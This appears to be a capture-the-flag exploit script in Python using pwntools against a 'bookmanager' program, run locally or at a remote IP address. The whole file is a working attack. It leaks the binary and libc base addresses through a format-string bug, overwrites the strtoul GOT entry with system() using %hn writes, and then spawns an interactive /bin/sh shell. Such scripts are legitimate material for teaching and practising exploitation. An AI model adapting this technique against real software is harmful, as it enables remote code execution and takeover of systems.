#!/usr/bin/env python
from pwn import *
context(arch='i386', os='linux', terminal=['sakura','-x'])
splash()
local = True
debug = False

p = process('./bookmanager') if local else remote('165.22.73.179', 710)
p.recvuntil('> ')

if local and debug:
    print p.pid
    pause()

def add_book(pos, author, title, length, content):
    p.sendline('2')
    p.recvuntil('> ')
    p.sendline(str(pos))
    p.recvuntil('> ')
    p.sendline(author)
    p.recvuntil('> ')
    p.sendline(title)
    p.recvuntil('> ')
    p.sendline(str(length))
    p.recvuntil('> ')
    p.sendline(content)
    p.recvuntil('> ')

def del_book(pos):
    p.sendline('3')
    p.recvuntil('> ')
    p.sendline(str(pos))
    p.recvuntil('> ')

def list_books():
    p.sendline('0')
    p.recvuntil('> ')

def read_book(pos):
    p.sendline('1')
    p.recvuntil('> ')
    p.sendline(str(pos))
    p.recvuntil('title\n\n')
    data = p.recvuntil('\n')[:-1]
    p.recvuntil('> ')
    return data

# Find the base address by leaking a known frame pointer
progress = log.progress("Finding binary base address")
add_book(0, 'author', 'title', 8, "%10$llu")
base_addr = int(read_book(0)) - 6323
progress.success(hex(base_addr))

# Construct leak function
addr_offset = 146
def leak(addr):
    if '\n' in p64(addr):
        print enhex(p64(addr))
        return None
    fmt_string = "%{}$s".format(addr_offset)
    add_book(7, p64(addr), 'title', len(fmt_string), fmt_string)
    data = read_book(7)
    del_book(7)
    return data + '\x00'

# Use leak to find system's address in libc
progress = log.progress("Finding address of system in libc")
fgets_got = base_addr + 0x4058
strtoul_got = base_addr + 0x4070
fgets_leak = leak(fgets_got).ljust(8, '\x00')
fgets_addr = u64(fgets_leak[:8])
fgets_offset = 0x67340
system_offset = 0x3f480

if local:
    system_offset = 0x42ad0
    fgets_offset = 0x6d650

libc_base = fgets_addr - fgets_offset
system_addr = system_offset + libc_base
progress.success(hex(system_addr))

if debug:
    print "libc_base", hex(libc_base)
    print "fgets_addr", hex(fgets_addr)
    print "system_addr", hex(system_addr)

# Place pointer to strtoul_got at known location
add_book(7, ''.join([p64(strtoul_got+i) for i in range(0,8,2)]), 'title', 10, 'abcd')

# Construct format string
progress = log.progress("Creating format string")
fmt_string = ''
written = 0
for i in range(0,4):
    word = p64(system_addr)[2*i:2*i+2]
    to_write = u16(word)

    value = 8
    written += 8

    while (written % 2**16) != to_write:
        value += 1
        written += 1

    fmt_string += "%.{}x%{}$hn".format(value, addr_offset+i)
progress.success("done")

# Trigger format string
add_book(6, 'author', 'title', len(fmt_string), fmt_string)
read_book(6)

# Send /bin/sh to strtoul (aka system)
p.clean()
p.sendline('/bin/sh\0')

# Shell!
p.interactive()
